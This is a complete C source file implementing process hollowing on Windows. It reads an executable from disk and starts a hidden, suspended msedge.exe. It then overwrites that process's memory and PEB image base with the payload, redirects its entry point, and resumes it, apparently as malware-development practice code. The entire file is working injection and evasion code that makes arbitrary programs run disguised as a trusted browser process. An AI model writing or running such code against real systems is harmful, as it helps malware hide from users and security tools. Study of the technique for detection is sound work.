#include <windows.h>
#include <winnt.h>
#include <stdio.h>
#include <strsafe.h>

// Define PEB with conditional compilation
#ifdef _WINTERNL_
#include <winternl.h>
#else
// Minimal PEB definition for 64-bit systems
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2]; // ImageBaseAddress is typically Reserved3[1]
} PEB, * PPEB;
#endif

// Define macros
#define PRINT_WINAPI_ERR(func, context) printf("[!] %s Failed in %s: Error %lu\n", func, context, GetLastError())
#define DELETE_HANDLE(h) if (h) { CloseHandle(h); h = NULL; }

BOOL ReadFileFromDisk(IN LPCWSTR cFileName, OUT PBYTE* ppBuffer, OUT PDWORD pdwFileSize) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    PBYTE pBuffer = NULL;
    DWORD dwFileSize = 0x00;
    DWORD dwNumberOfBytesRead = 0x00;

    if ((hFile = CreateFileW(cFileName, GENERIC_READ, 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
        PRINT_WINAPI_ERR("CreateFileW", "ReadFileFromDisk");
        goto _FUNC_CLEANUP;
    }

    if ((dwFileSize = GetFileSize(hFile, NULL)) == INVALID_FILE_SIZE) {
        PRINT_WINAPI_ERR("GetFileSize", "ReadFileFromDisk");
        goto _FUNC_CLEANUP;
    }

    if ((pBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFileSize)) == NULL) {
        PRINT_WINAPI_ERR("HeapAlloc", "ReadFileFromDisk");
        goto _FUNC_CLEANUP;
    }

    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead) {
        PRINT_WINAPI_ERR("ReadFile", "ReadFileFromDisk");
        goto _FUNC_CLEANUP;
    }

    *ppBuffer = pBuffer;
    *pdwFileSize = dwFileSize;
    return TRUE;

_FUNC_CLEANUP:
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    if (!*ppBuffer && pBuffer) HeapFree(GetProcessHeap(), 0x00, pBuffer);
    return FALSE;
}

BOOL CreateHollowedProcess(IN LPCWSTR cRemoteProcessImage, IN OPTIONAL LPCWSTR cProcessParams, OUT LPPROCESS_INFORMATION pProcessInfo, OUT HANDLE* pStdInWrite, OUT HANDLE* pStdOutRead) {
    STARTUPINFO StartupInfo = { 0x00 };
    PROCESS_INFORMATION ProcessInfo = { 0x00 };
    SECURITY_ATTRIBUTES SecAttr = { 0x00 };
    HANDLE StdInRead = NULL;
    HANDLE StdInWrite = NULL;
    HANDLE StdOutRead = NULL;
    HANDLE StdOutWrite = NULL;
    LPWSTR cBuffer = NULL;
    BOOL bSTATE = FALSE;

    RtlSecureZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&SecAttr, sizeof(SECURITY_ATTRIBUTES));

    SecAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    SecAttr.bInheritHandle = TRUE;
    SecAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&StdInRead, &StdInWrite, &SecAttr, 0x00)) {
        PRINT_WINAPI_ERR("CreatePipe[1]", "CreateHollowedProcess");
        goto _FUNC_CLEANUP;
    }

    if (!CreatePipe(&StdOutRead, &StdOutWrite, &SecAttr, 0x00)) {
        PRINT_WINAPI_ERR("CreatePipe[2]", "CreateHollowedProcess");
        goto _FUNC_CLEANUP;
    }

    if (!SetHandleInformation(StdOutRead, HANDLE_FLAG_INHERIT, 0)) {
        PRINT_WINAPI_ERR("SetHandleInformation", "CreateHollowedProcess");
        goto _FUNC_CLEANUP;
    }

    if (!SetHandleInformation(StdInWrite, HANDLE_FLAG_INHERIT, 0)) {
        PRINT_WINAPI_ERR("SetHandleInformation", "CreateHollowedProcess");
        goto _FUNC_CLEANUP;
    }

    StartupInfo.cb = sizeof(STARTUPINFO);
    StartupInfo.dwFlags |= (STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES);
    StartupInfo.wShowWindow = SW_HIDE;
    StartupInfo.hStdInput = StdInRead;
    StartupInfo.hStdOutput = StdOutWrite;
    StartupInfo.hStdError = StdOutWrite;

    SIZE_T bufferSize = (wcslen(cRemoteProcessImage) + (cProcessParams ? wcslen(cProcessParams) : 0) + 2) * sizeof(WCHAR);
    cBuffer = LocalAlloc(LPTR, bufferSize);
    if (!cBuffer) {
        PRINT_WINAPI_ERR("LocalAlloc", "CreateHollowedProcess");
        goto _FUNC_CLEANUP;
    }

    StringCchPrintfW(cBuffer, bufferSize / sizeof(WCHAR), cProcessParams == NULL ? L"%s" : L"%s %s", cRemoteProcessImage, cProcessParams == NULL ? L"" : cProcessParams);

    if (!CreateProcessW(NULL, cBuffer, &SecAttr, NULL, TRUE, (CREATE_SUSPENDED | CREATE_NEW_CONSOLE), NULL, NULL, &StartupInfo, &ProcessInfo)) {
        PRINT_WINAPI_ERR("CreateProcessW", "CreateHollowedProcess");
        goto _FUNC_CLEANUP;
    }
    printf("[*] Process Created: PID = %lu, Handle = %p, Thread = %p\n", ProcessInfo.dwProcessId, ProcessInfo.hProcess, ProcessInfo.hThread);

    *pProcessInfo = ProcessInfo;
    *pStdInWrite = StdInWrite;
    *pStdOutRead = StdOutRead;
    bSTATE = TRUE;

_FUNC_CLEANUP:
    if (cBuffer) LocalFree(cBuffer);
    if (StdInRead) DELETE_HANDLE(StdInRead);
    if (StdOutWrite) DELETE_HANDLE(StdOutWrite);
    return bSTATE;
}

BOOL ReplaceBaseAddressImage(IN HANDLE hProcess, IN ULONG_PTR uPeBaseAddress, IN ULONG_PTR Rdx) {
    ULONG_PTR uRemoteImageBaseOffset = 0x00;
    SIZE_T NumberOfBytesWritten = 0x00;

#ifdef _WINTERNL_
    uRemoteImageBaseOffset = Rdx + offsetof(PEB, Reserved3[1]);
#else
    uRemoteImageBaseOffset = Rdx + offsetof(PEB, Reserved3[1]);
#endif

    if (!WriteProcessMemory(hProcess, (PVOID)uRemoteImageBaseOffset, &uPeBaseAddress, sizeof(ULONG_PTR), &NumberOfBytesWritten) || sizeof(ULONG_PTR) != NumberOfBytesWritten) {
        PRINT_WINAPI_ERR("WriteProcessMemory", "ReplaceBaseAddressImage");
        return FALSE;
    }

    return TRUE;
}

BOOL FixMemPermissionsEx(IN HANDLE hProcess, IN ULONG_PTR pPeBaseAddress, IN PIMAGE_NT_HEADERS pImgNtHdrs, IN PIMAGE_SECTION_HEADER pImgSecHdr) {
    for (DWORD i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        DWORD dwProtection = 0x00, dwOldProtection = 0x00;

        if (!pImgSecHdr[i].SizeOfRawData || !pImgSecHdr[i].VirtualAddress) continue;

        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE)
            dwProtection = PAGE_WRITECOPY;
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ)
            dwProtection = PAGE_READONLY;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_READWRITE;
        if (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
            dwProtection = PAGE_EXECUTE;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE))
            dwProtection = PAGE_EXECUTE_WRITECOPY;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READ;
        if ((pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_WRITE) && (pImgSecHdr[i].Characteristics & IMAGE_SCN_MEM_READ))
            dwProtection = PAGE_EXECUTE_READWRITE;

        if (!VirtualProtectEx(hProcess, (PVOID)(pPeBaseAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData, dwProtection, &dwOldProtection)) {
            PRINT_WINAPI_ERR("VirtualProtectEx", "FixMemPermissionsEx");
            return FALSE;
        }
    }

    return TRUE;
}

VOID PrintOutput(IN HANDLE StdOutRead, IN HANDLE hProcess) {
    DWORD dwAvailableBytes = 0x00;
    PBYTE pBuffer = NULL;
    DWORD dwNumberOfBytesRead = 0x00;
    BOOL bSTATE = TRUE;
    DWORD dwExitCode = STILL_ACTIVE;

    while (GetExitCodeProcess(hProcess, &dwExitCode) && dwExitCode == STILL_ACTIVE) {
        if (!PeekNamedPipe(StdOutRead, NULL, 0, NULL, &dwAvailableBytes, NULL)) {
            PRINT_WINAPI_ERR("PeekNamedPipe", "PrintOutput");
            break;
        }

        if (dwAvailableBytes > 0) {
            pBuffer = (PBYTE)LocalAlloc(LPTR, dwAvailableBytes);
            if (!pBuffer) break;

            if (!(bSTATE = ReadFile(StdOutRead, pBuffer, dwAvailableBytes, &dwNumberOfBytesRead, NULL))) {
                PRINT_WINAPI_ERR("ReadFile", "PrintOutput");
                LocalFree(pBuffer);
                break;
            }

            PBYTE pPrintableBuffer = (PBYTE)LocalAlloc(LPTR, dwNumberOfBytesRead + 1);
            if (pPrintableBuffer) {
                memcpy(pPrintableBuffer, pBuffer, dwNumberOfBytesRead);
                pPrintableBuffer[dwNumberOfBytesRead] = '\0';
                printf("[*] Output: %s\n", pPrintableBuffer);
                LocalFree(pPrintableBuffer);
            }

            LocalFree(pBuffer);
            pBuffer = NULL;
        }

        Sleep(100);
    }

    if (PeekNamedPipe(StdOutRead, NULL, 0, NULL, &dwAvailableBytes, NULL) && dwAvailableBytes > 0) {
        pBuffer = (PBYTE)LocalAlloc(LPTR, dwAvailableBytes);
        if (pBuffer) {
            if (ReadFile(StdOutRead, pBuffer, dwAvailableBytes, &dwNumberOfBytesRead, NULL)) {
                PBYTE pPrintableBuffer = (PBYTE)LocalAlloc(LPTR, dwNumberOfBytesRead + 1);
                if (pPrintableBuffer) {
                    memcpy(pPrintableBuffer, pBuffer, dwNumberOfBytesRead);
                    pPrintableBuffer[dwNumberOfBytesRead] = '\0';
                    printf("[*] Final Output: %s\n", pPrintableBuffer);
                    LocalFree(pPrintableBuffer);
                }
            }
            LocalFree(pBuffer);
        }
    }
}

BOOL RemotePeExec(IN PBYTE pPeBuffer, IN LPCWSTR cRemoteProcessImage, IN OPTIONAL LPCWSTR cProcessParams) {
    if (!pPeBuffer || !cRemoteProcessImage) return FALSE;

    PROCESS_INFORMATION ProcessInfo = { 0x00 };
    CONTEXT Context = { .ContextFlags = CONTEXT_ALL };
    HANDLE StdInWrite = NULL;
    HANDLE StdOutRead = NULL;
    PBYTE pRemoteAddress = NULL;
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;
    PIMAGE_SECTION_HEADER pImgSecHdr = NULL;
    SIZE_T NumberOfBytesWritten = 0;
    BOOL bSTATE = FALSE;

    if (!CreateHollowedProcess(cRemoteProcessImage, cProcessParams, &ProcessInfo, &StdInWrite, &StdOutRead)) goto _FUNC_CLEANUP;

    if (!ProcessInfo.hProcess || !ProcessInfo.hThread) goto _FUNC_CLEANUP;

    pImgNtHdrs = (PIMAGE_NT_HEADERS)((ULONG_PTR)pPeBuffer + ((PIMAGE_DOS_HEADER)pPeBuffer)->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) goto _FUNC_CLEANUP;
    printf("[*] Preferred Base Address: %p, SizeOfImage: %lu\n", (PVOID)pImgNtHdrs->OptionalHeader.ImageBase, pImgNtHdrs->OptionalHeader.SizeOfImage);

    pRemoteAddress = VirtualAllocEx(ProcessInfo.hProcess, (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase, (SIZE_T)pImgNtHdrs->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteAddress) {
        PRINT_WINAPI_ERR("VirtualAllocEx", "RemotePeExec");
        goto _FUNC_CLEANUP;
    }
    printf("[*] Remote Base Address: %p\n", pRemoteAddress);

    if (pRemoteAddress != (LPVOID)pImgNtHdrs->OptionalHeader.ImageBase) {
        printf("[!] Relocation Required: Allocated = %p, Requested = %p\n", pRemoteAddress, (PVOID)pImgNtHdrs->OptionalHeader.ImageBase);
        goto _FUNC_CLEANUP;
    }

    if (!WriteProcessMemory(ProcessInfo.hProcess, pRemoteAddress, pPeBuffer, pImgNtHdrs->OptionalHeader.SizeOfHeaders, &NumberOfBytesWritten) || pImgNtHdrs->OptionalHeader.SizeOfHeaders != NumberOfBytesWritten) {
        PRINT_WINAPI_ERR("WriteProcessMemory", "RemotePeExec (Headers)");
        goto _FUNC_CLEANUP;
    }
    printf("[*] Wrote Headers: %lu bytes\n", NumberOfBytesWritten);

    pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs);
    for (int i = 0; i < pImgNtHdrs->FileHeader.NumberOfSections; i++) {
        if (!WriteProcessMemory(ProcessInfo.hProcess, (PVOID)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), (PVOID)(pPeBuffer + pImgSecHdr[i].PointerToRawData), pImgSecHdr[i].SizeOfRawData, &NumberOfBytesWritten) || pImgSecHdr[i].SizeOfRawData != NumberOfBytesWritten) {
            PRINT_WINAPI_ERR("WriteProcessMemory", "RemotePeExec (Section)");
            goto _FUNC_CLEANUP;
        }
        printf("[*] Wrote Section %u: %.8s, VA = %p, Size = %lu\n", i, pImgSecHdr[i].Name, (PVOID)(pRemoteAddress + pImgSecHdr[i].VirtualAddress), pImgSecHdr[i].SizeOfRawData);
    }

    if (!GetThreadContext(ProcessInfo.hThread, &Context)) {
        PRINT_WINAPI_ERR("GetThreadContext", "RemotePeExec");
        goto _FUNC_CLEANUP;
    }

    if (!ReplaceBaseAddressImage(ProcessInfo.hProcess, (ULONG_PTR)pRemoteAddress, Context.Rdx)) goto _FUNC_CLEANUP;

    Context.Rcx = (LPVOID)((ULONG_PTR)pRemoteAddress + pImgNtHdrs->OptionalHeader.AddressOfEntryPoint);
    if (!SetThreadContext(ProcessInfo.hThread, &Context)) {
        PRINT_WINAPI_ERR("SetThreadContext", "RemotePeExec");
        goto _FUNC_CLEANUP;
    }

    if (!FixMemPermissionsEx(ProcessInfo.hProcess, (ULONG_PTR)pRemoteAddress, pImgNtHdrs, pImgSecHdr)) goto _FUNC_CLEANUP;

    if (ResumeThread(ProcessInfo.hThread) == ((DWORD)-1)) {
        PRINT_WINAPI_ERR("ResumeThread", "RemotePeExec");
        goto _FUNC_CLEANUP;
    }
    printf("[*] Thread Resumed\n");

    const char input[] = "1\n";
    DWORD dwBytesWritten = 0;
    if (!WriteFile(StdInWrite, input, sizeof(input) - 1, &dwBytesWritten, NULL) || dwBytesWritten != sizeof(input) - 1) {
        PRINT_WINAPI_ERR("WriteFile", "RemotePeExec (StdIn)");
    }
    else {
        printf("[*] Wrote Input: %lu bytes\n", dwBytesWritten);
    }

    PrintOutput(StdOutRead, ProcessInfo.hProcess);
    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);

    bSTATE = TRUE;

_FUNC_CLEANUP:
    if (StdInWrite) DELETE_HANDLE(StdInWrite);
    if (StdOutRead) DELETE_HANDLE(StdOutRead);
    if (ProcessInfo.hProcess) DELETE_HANDLE(ProcessInfo.hProcess);
    if (ProcessInfo.hThread) DELETE_HANDLE(ProcessInfo.hThread);
    return bSTATE;
}

int main() {
    LPCWSTR FileToRun = L"C:\\Users\\MALDEV01\\Desktop\\Tools\\Test-Exe\\Test-Exe\\x64\\Release\\Test-Exe.exe";
    LPCWSTR ProcessToStart = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    LPCWSTR ProcessParams = L"1";
    PBYTE pFileBuffer = NULL;
    DWORD dwFileSize = 0x00;

    if (!ReadFileFromDisk(FileToRun, &pFileBuffer, &dwFileSize)) {
        printf("[!] ReadFileFromDisk failed\n");
        return -1;
    }

    int result = RemotePeExec(pFileBuffer, ProcessToStart, ProcessParams) ? 0 : -1;

    if (pFileBuffer) HeapFree(GetProcessHeap(), 0, pFileBuffer);
    return result;
}
